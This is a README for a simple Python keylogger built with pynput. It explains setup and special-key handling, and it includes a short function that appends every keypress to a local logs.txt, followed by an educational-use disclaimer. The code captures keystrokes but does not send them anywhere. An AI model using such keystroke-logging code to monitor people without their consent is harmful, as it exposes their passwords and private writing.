
# Keylogger with Pynput

This project implements a simple keylogger using Python and the `pynput` library. The keylogger listens for keypress events and logs them to a file (`logs.txt`). Special keys like `Space`, `Enter`, and `Backspace` are handled appropriately, and their behavior is reflected in the log.

## Features
- Logs all keypresses including letters, numbers, and symbols.
- Handles special keys:
  - `Space`: Logged as a space character (`' '`).
  - `Enter`: Logged as a new line (`'\n'`).
  - `Backspace`: Removes the last character from the log.
- Supports other keys like `Shift` and `Ctrl` without logging them.
  
## Requirements

To run this project, you need the following dependencies:

- Python 3.x
- `pynput` library

You can install the required library using pip:

```bash
pip install pynput
```

## How to Use

1. **Clone the Repository:**

   ```bash
   git clone https://github.com/your-username/keylogger-pynput.git
   cd keylogger-pynput
   ```

2. **Run the Keylogger:**

   After cloning the repository, you can run the keylogger with:

   ```bash
   python keylogger.py
   ```

3. **Logging Keystrokes:**

   The keylogger will create or append keystrokes to a file named `logs.txt` in the same directory. Special keys like `Space`, `Enter`, and `Backspace` are processed and handled correctly:
   - `Space` → Logged as a space (` `).
   - `Enter` → Logged as a newline.
   - `Backspace` → Removes the last character from the log file.

4. **Stopping the Keylogger:**

   You can stop the keylogger by pressing `Ctrl + C` in the terminal where it is running.

## Code Explanation

The main functionality uses Python's `pynput` library to listen for key presses.

### Key Components:
- **`writetofile(key)`**: This function processes each keypress. It handles special keys such as `Space`, `Enter`, and `Backspace` appropriately. For regular characters, it appends them directly to the `logs.txt` file.
- **`Listener`**: The listener captures all keyboard events and calls the `writetofile` function on each keypress.

### Handling Special Keys:
- **Space**: Replaces `'Key.space'` with a space character.
- **Enter**: Replaces `'Key.enter'` with a newline character.
- **Backspace**: Reads the `logs.txt` file, removes the last character, and writes the updated content back to the file.

### Example Code Snippet:

```python
def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    # Handle specific key replacements
    if keydata == 'Key.space':
        keydata = ' '
    elif keydata == 'Key.enter':
        keydata = '\n'
    elif keydata == 'Key.backspace':
        with open("logs.txt", 'r') as f:
            content = f.read()
        content = content[:-1] if content else content
        with open("logs.txt", 'w') as f:
            f.write(content)
        return

    with open("logs.txt", 'a') as f:
        f.write(keydata)
```

## Important Notes

- This project is intended for educational purposes only. **Make sure to obtain permission** before using this keylogger on any computer or network.
- Misuse of keylogging software can lead to legal consequences. Ensure that you comply with all relevant laws in your jurisdiction.

## Contributions

Contributions are welcome! If you find any bugs or have suggestions for improvements, feel free to submit a pull request or create an issue.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

